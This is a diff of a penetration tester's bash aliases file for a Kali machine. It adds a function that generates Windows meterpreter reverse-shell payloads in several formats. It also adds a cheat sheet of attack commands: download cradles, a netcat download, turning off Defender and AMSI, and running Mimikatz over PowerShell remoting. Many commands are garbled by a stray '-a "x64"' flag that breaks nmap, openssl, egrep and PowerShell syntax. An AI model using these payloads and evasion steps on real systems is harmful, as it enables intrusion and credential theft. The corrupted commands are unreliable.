@@ -119,7 +119,7 @@ alias exip="curl -s http://ipinfo.io/ip"
 #copy output to clipboard
 echo "pbcopy - used with a pipe, puts stdout of a command to clipboard - cat report.txt | pbcopy"
 alias pbcopy='xclip -selection clipboard'
-alias pbpaste='xclip -selection clipboard -o'
+alias pbpaste='xclip -selection clipboard -a "x64" -o'
 
 ## Unzip & untar
 echo "unzip - uses 7z to unzip a file - unzip <filename.zip>"
@@ -191,7 +191,7 @@ function nginxsslcert() {
         [ -z "$CERT_CN" ] && CERT_CN="www.microsoft.com"
 
          sudo mkdir -pv $SSL_LOCATION
-         sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout "$SSL_LOCATION/server.key" -out "$SSL_LOCATION/server.crt" -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCATION/O=$CERT_ORGANIZATION/OU=$CERT_OU/CN=$CERT_CN"
+         sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout "$SSL_LOCATION/server.key" -a "x64" -out "$SSL_LOCATION/server.crt" -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCATION/O=$CERT_ORGANIZATION/OU=$CERT_OU/CN=$CERT_CN"
          echo "\n\nSSL Certificate and Key have been saved to: $SSL_LOCATION"
          echo ""
          echo ""
@@ -271,13 +271,13 @@ echo -e "${YELLOW}${BOLD}[ - INFRA PENTEST - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
 
 echo "nmapfastscan - runs NMAP scanner; fast top1000 TCP; specify <IP's>"
-alias nmapfastscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -Pn -n --top-ports 1000 -vvvv --open --max-retries 3 --max-rtt-timeout 900ms --min-hostgroup 254 --min-rate 30000 --defeat-rst-ratelimit --host-timeout 1m "
+alias nmapfastscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -Pn -n --top-ports 1000 -vvvv --a "x64" -open --max-retries 3 --max-rtt-timeout 900ms --min-hostgroup 254 --min-rate 30000 --defeat-rst-ratelimit --host-timeout 1m "
 
 echo "nmapfulltcpscan - runs NMAP scanner; all TCP ports; specify <IP's>"
-alias nmapfulltcpscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -Pn -p- -vvvv --open --min-rate 20000 --defeat-rst-ratelimit --host-timeout 5m -oA /tmp/nmap_fulltcp --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl "
+alias nmapfulltcpscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -Pn -p- -vvvv --a "x64" -open --min-rate 20000 --defeat-rst-ratelimit --host-timeout 5m -a "x64" -oA /tmp/nmap_fulltcp --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl "
 
 echo "nmapservicescan - runs NMAP scanner; specific TCP ports; specify <IP's> and -p <PORTS>"
-alias nmapservicescan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -sV -vvvv --open -sC --script-timeout 15m -O -Pn -oA /tmp/nmap_servicescan "
+alias nmapservicescan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -sV -vvvv --a "x64" -open -sC --script-timeout 15m -a "x64" -o -Pn -a "x64" -oA /tmp/nmap_servicescan "
 
 echo "testssl-docker - testssl docker version - testssl-docker"
 alias testssl-docker='sudo docker run --rm -ti -v "${PWD}:/data" drwetter/testssl.sh -s -f -p -S -P -h -U --ip one --htmlfile /data/ --logfile /data/ --jsonfile-pretty /data/ --csvfile /data/ --warnings=batch'
@@ -288,7 +288,7 @@ alias cme='sudo docker run --rm -it --entrypoint=/usr/local/bin/cme --name crack
 echo "getports - returns ports of a nmap scan - getports <nmapfile.nmap>"
 function getports() {
         # extracts all ports from an nmap scan file as one-line
-        # to be used as -sS -Pn -sV -sC -O -p <oneliner>
+        # to be used as -sS -Pn -sV -sC -a "x64" -o -p <oneliner>
         nmap_file=$1
         RED='\033[0;31m'
         NC='\033[0m' # No Color
@@ -334,7 +334,7 @@ echo "purednsburte - DNS bruteforce - purednsbrute <wordlist> <domain>"
 alias purednsbrute='puredns bruteforce -r /opt/tools/osint/dnsvalidator/resolvers.txt'
 
 echo "dnsvalidator - update dnsvalidators"
-alias dnsvalidator="sudo docker run -v /opt/tools/osint/dnsvalidator:/dnsvalidator/output -t dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o /dnsvalidator/output/resolvers.txt"
+alias dnsvalidator="sudo docker run -v /opt/tools/osint/dnsvalidator:/dnsvalidator/output -t dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -a "x64" -o /dnsvalidator/output/resolvers.txt"
 
 echo "xingdumper -u <xing-company-url> - extracts XING employees as CSV"
 alias xingdumper="python3 /opt/tools/osint/XingDumper/xingdumper.py"
@@ -351,7 +351,7 @@ echo "jsEndpoints - find endpoints in JavaScript file - jsEndpoints <url to js>"
 function jsEndpoints() {
         URL=$1
         if [ $# -eq 1 ];then
-                curl -Lks $URL | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=$URL '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
+                curl -Lks $URL | tac | sed "s#\\\/#\/#g" | egrep -a "x64" -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=$URL '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
         else
                 echo -e "${RED}Please enter an URL as argument ... jsEndpoints <url to js>${NC}"
         fi
@@ -362,7 +362,127 @@ function jsEndpoints() {
 echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
-echo "msfgenpayloads - Generate different msfpayloads - msfgenpayloads <INTERFACE> <PORT>"
+echo "msfgenpayloads - Generate different msfpayloads - msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>"
+function msfgenpayloads(){
+
+
+        if [ $# -eq 3 ];then
+                INTERFACE=$1
+                IPV4="$(ip -a -o -4 addr list $INTERFACE | awk '{print $4}' | cut -d/ -f1)"
+                HTTPS_PORT=$2
+                TCP_PORT=$3
+
+                echo "Generating meterpreter payloads..."
+
+                
+                echo "\n${YELLOW}${BOLD}Generating meterpreter RAW${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
+
+
+                echo "\n${YELLOW}${BOLD}Generating meterpreter C#${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.csharp"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
+
+
+                echo "\n${YELLOW}${BOLD}Generating meterpreter Powershell${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f ps1 -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.ps1"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "ps1" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.ps1"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f ps1 -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.ps1"                
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "ps1" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.ps1"
+
+                
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f powershell -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.powershell"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.powershell"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f powershell -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"
+                
+                echo "\n${YELLOW}${BOLD}Generating meterpreter VBA${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"
+
+
+                echo "\n${YELLOW}${BOLD}Generating meterpreter vbscript${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f vbscript -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vbscript"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "vbscript" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vbscript"
+                echo ""
+                echo "\n${YELLOW}${BOLD}Generating meterpreter vba${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vbscript"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"
+
+                echo "\n${YELLOW}${BOLD}Payloads have been generated successfully. Bye${NC}"
+
+        else
+                echo -e "${RED}Please the interface and port you want to listen - msfgenpayloads msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>${NC}"
+        fi   
+}
+
+echo -e "${YELLOW}${BOLD}\n========================${NC}"
+echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
+echo -e "${YELLOW}${BOLD}========================${NC}"
+echo "iex - command templates for Windows"
+function iex(){
+        cat << EOF
+# Functions of a module
+Get-Command -Module nishang
+
+# Help about a function
+Get-Help Get-ServiceDetail
+
+# Download
+echo "iex((New-a "x64" -object net.webclient).DownloadString(''))" #in memory
+echo "(new-a "x64" -object System.Net.WebClient).DownloadFile('<url>','C:\\Users\\Public\\<filename>'')" #ondisk
+
+
+bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
+
+
+# Encode/Decode
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("<cmd>"))
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ep bypass -enc <base64>
+
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>'))
+
+# AV Evasion
+Set-MpPreference -DisableRealtimeMonitoring \$true
+
+
+# Trusted Installer
+\$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
+\$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument \$cmdline
+Register-ScheduledTask -TaskName 'TestTask' -Action \$a
+\$svc = New-a "x64" -object -ComObject 'Schedule.Service'
+\$svc.Connect()
+\$user = 'NT SERVICE\TrustedInstaller'
+\$folder = \$svc.GetFolder('\')
+\$task = \$folder.GetTask('TestTask')
+\$task.RunEx(\$null, 0, 0, \$user)
+
+# PSRemoting
+\$SecPassword = ConvertTo-SecureString 'PASSWD' -AsPlainText -Force
+\$Cred = New-a "x64" -object System.Management.Automation.PSCredential('DOMAIN\USER', \$SecPassword)
+\$s = New-PSSession -ComputerName COMPUTER -Credential \$Cred
+Invoke-Command -Session \$s -FilePath C:\AD\Tools\Disable-Amsi.ps1
+Invoke-Command –Session \$s -ScriptBlock {Disable-Amsi}
+Invoke-Command -Session \$s -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
+Invoke-Command –Session \$s -ScriptBlock {Invoke-Mimikatz}
+
+EOF
+
+
+}
+
 
 
 echo -e "${YELLOW}${BOLD}\n==============================${NC}"
@@ -370,5 +490,7 @@ echo -e "${YELLOW}${BOLD}[ - ALIASES - ]${NC}"
 echo -e "${YELLOW}${BOLD}==============================${NC}"
 echo "updatealiases - update .bash_aliases with newest github version"
 alias updatealiases='(curl -k -q -L -f "https://raw.githubusercontent.com/michiiii/KALI_vagrant/master/bash_aliases" > ~/.bash_aliases) && source ~/.bash_aliases && echo "Updated aliases..."'
+
+
 
 echo -e "${YELLOW}${BOLD}\n==============================\n${NC}"
